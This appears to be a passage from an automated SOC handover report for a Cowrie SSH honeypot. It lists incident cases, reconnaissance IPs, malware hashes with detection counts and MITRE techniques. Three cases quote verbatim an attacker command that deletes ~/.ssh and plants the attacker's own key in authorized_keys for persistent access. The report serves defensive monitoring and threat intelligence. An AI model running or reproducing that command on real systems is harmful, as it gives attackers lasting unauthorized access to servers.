| Field | Detail |
|---|---|
| **Source IP** | `42.96.43[.]148` |
| **First Seen** | 2026-04-14 21:19 |
| **Last Seen** | 2026-04-14 21:19 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 21:19:36` | `cowrie.session.connect` |
| `2026-04-14 21:19:36` | `cowrie.client.version` |
| `2026-04-14 21:19:36` | `cowrie.client.kex` |
| `2026-04-14 21:19:36` | `cowrie.login.success` |
| `2026-04-14 21:19:36` | `cowrie.session.params` |
| `2026-04-14 21:19:36` | `cowrie.command.input` |
| `2026-04-14 21:19:36` | `cowrie.command.failed` |
| `2026-04-14 21:19:36` | `cowrie.log.closed` |
| `2026-04-14 21:19:37` | `cowrie.session.params` |
| `2026-04-14 21:19:37` | `cowrie.command.input` |
| `2026-04-14 21:19:37` | `cowrie.session.file_download` |
| `2026-04-14 21:19:37` | `cowrie.log.closed` |
| `2026-04-14 21:19:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.96.43[.]148` to AbuseIPDB if not already reported
- [ ] Block `42.96.43[.]148` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9938741ead6

| Field | Detail |
|---|---|
| **Source IP** | `42.96.43[.]148` |
| **First Seen** | 2026-04-14 21:19 |
| **Last Seen** | 2026-04-14 21:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 21:19:38` | `cowrie.session.connect` |
| `2026-04-14 21:19:38` | `cowrie.client.version` |
| `2026-04-14 21:19:39` | `cowrie.client.kex` |
| `2026-04-14 21:19:39` | `cowrie.login.success` |
| `2026-04-14 21:19:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.96.43[.]148` to AbuseIPDB if not already reported
- [ ] Block `42.96.43[.]148` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53ac3fa8c707

| Field | Detail |
|---|---|
| **Source IP** | `42.96.43[.]148` |
| **First Seen** | 2026-04-14 21:21 |
| **Last Seen** | 2026-04-14 21:21 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 21:21:24` | `cowrie.session.connect` |
| `2026-04-14 21:21:24` | `cowrie.client.version` |
| `2026-04-14 21:21:24` | `cowrie.client.kex` |
| `2026-04-14 21:21:24` | `cowrie.login.success` |
| `2026-04-14 21:21:25` | `cowrie.session.params` |
| `2026-04-14 21:21:25` | `cowrie.command.input` |
| `2026-04-14 21:21:25` | `cowrie.command.failed` |
| `2026-04-14 21:21:25` | `cowrie.log.closed` |
| `2026-04-14 21:21:25` | `cowrie.session.params` |
| `2026-04-14 21:21:25` | `cowrie.command.input` |
| `2026-04-14 21:21:25` | `cowrie.session.file_download` |
| `2026-04-14 21:21:25` | `cowrie.log.closed` |
| `2026-04-14 21:21:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.96.43[.]148` to AbuseIPDB if not already reported
- [ ] Block `42.96.43[.]148` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9b11322a4e0

| Field | Detail |
|---|---|
| **Source IP** | `42.96.43[.]148` |
| **First Seen** | 2026-04-14 21:21 |
| **Last Seen** | 2026-04-14 21:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 21:21:27` | `cowrie.session.connect` |
| `2026-04-14 21:21:27` | `cowrie.client.version` |
| `2026-04-14 21:21:27` | `cowrie.client.kex` |
| `2026-04-14 21:21:28` | `cowrie.login.success` |
| `2026-04-14 21:21:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.96.43[.]148` to AbuseIPDB if not already reported
- [ ] Block `42.96.43[.]148` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-544d5205542f

| Field | Detail |
|---|---|
| **Source IP** | `42.96.43[.]148` |
| **First Seen** | 2026-04-14 21:33 |
| **Last Seen** | 2026-04-14 21:34 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 21:33:57` | `cowrie.session.connect` |
| `2026-04-14 21:33:57` | `cowrie.client.version` |
| `2026-04-14 21:33:57` | `cowrie.client.kex` |
| `2026-04-14 21:33:57` | `cowrie.login.success` |
| `2026-04-14 21:33:58` | `cowrie.session.params` |
| `2026-04-14 21:33:58` | `cowrie.command.input` |
| `2026-04-14 21:33:58` | `cowrie.command.failed` |
| `2026-04-14 21:33:58` | `cowrie.log.closed` |
| `2026-04-14 21:33:58` | `cowrie.session.params` |
| `2026-04-14 21:33:58` | `cowrie.command.input` |
| `2026-04-14 21:33:58` | `cowrie.session.file_download` |
| `2026-04-14 21:33:58` | `cowrie.log.closed` |
| `2026-04-14 21:34:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.96.43[.]148` to AbuseIPDB if not already reported
- [ ] Block `42.96.43[.]148` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-021b357c61b1

| Field | Detail |
|---|---|
| **Source IP** | `42.96.43[.]148` |
| **First Seen** | 2026-04-14 21:34 |
| **Last Seen** | 2026-04-14 21:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 21:34:00` | `cowrie.session.connect` |
| `2026-04-14 21:34:00` | `cowrie.client.version` |
| `2026-04-14 21:34:00` | `cowrie.client.kex` |
| `2026-04-14 21:34:00` | `cowrie.login.success` |
| `2026-04-14 21:34:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.96.43[.]148` to AbuseIPDB if not already reported
- [ ] Block `42.96.43[.]148` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40ed0c68ab45

| Field | Detail |
|---|---|
| **Source IP** | `104.131.3[.]211` |
| **First Seen** | 2026-04-14 22:02 |
| **Last Seen** | 2026-04-14 22:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 22:02:04` | `cowrie.session.connect` |
| `2026-04-14 22:02:04` | `cowrie.client.version` |
| `2026-04-14 22:02:05` | `cowrie.client.kex` |
| `2026-04-14 22:02:06` | `cowrie.login.success` |
| `2026-04-14 22:02:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.131.3[.]211` to AbuseIPDB if not already reported
- [ ] Block `104.131.3[.]211` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `107.174.82[.]77` | **24** | 2026-04-14 21:01 | 2026-04-14 21:06 | 0m | 24 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `42.96.43[.]148` | **23** | 2026-04-14 20:59 | 2026-04-14 21:39 | 0m | 23 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `183.250.89[.]44` | **18** | 2026-04-14 20:59 | 2026-04-14 21:03 | 36m | 0 | `T1592` | 🟠 MEDIUM |
| `122.114.8[.]57` | **15** | 2026-04-14 21:00 | 2026-04-14 21:35 | 28m | 1 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `14.103.145[.]231` | **13** | 2026-04-14 20:59 | 2026-04-14 22:01 | 19m | 4 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `14.103.73[.]80` | **11** | 2026-04-14 20:59 | 2026-04-14 21:04 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `172.185.24[.]228` | **10** | 2026-04-14 20:59 | 2026-04-14 21:15 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `101.126.83[.]70` | **2** | 2026-04-14 20:59 | 2026-04-14 21:00 | 2m | 0 | `T1592` | 🟢 LOW |
| `103.42.140[.]200` | 1 | 2026-04-14 22:30 | 2026-04-14 22:30 | 15s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (22 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 41/100 | 🟡 MEDIUM | **29/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 41/100 | 🟡 MEDIUM | **28/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `172.185.24[.]228` | US | Microsoft Limited | **100** ⚠️ | 50 |
| `42.96.43[.]148` | VN | CMC Telecom Infrastructure Company | **100** ⚠️ | 50 |
| `104.131.3[.]211` | US | DigitalOcean, LLC | **100** ⚠️ | 8 |
| `14.103.73[.]80` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `14.103.145[.]231` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `183.250.89[.]44` | CN | China Mobile Communications Corporation | **100** ⚠️ | 50 |
| `122.114.8[.]57` | CN | Zhengzhou GIANT Computer Network Technology Co., Ltd | **100** ⚠️ | 4 |
| `101.126.83[.]70` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 9 |
| `107.174.82[.]77` | US | HostPapa | **100** ⚠️ | 0 |
| `103.42.140[.]200` | AU | Buroserv Australia Pty Ltd | **100** ⚠️ | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 159 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 72 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 54 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 26 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 26 |

---

## 🔕 False Positive Summary (23 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 15 below threshold 25 | 1 |
| AbuseIPDB score 20 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 20 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 193 cases |
| Tool 34  | Credential Extractor        | ✅ 126 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 4 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 16 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 23 filtered (11.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 13 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 22 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 53 priority case(s) shown individually · 9 recon entry/entries in table (8 group(s) consolidating 116 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-14T22:52:02Z_
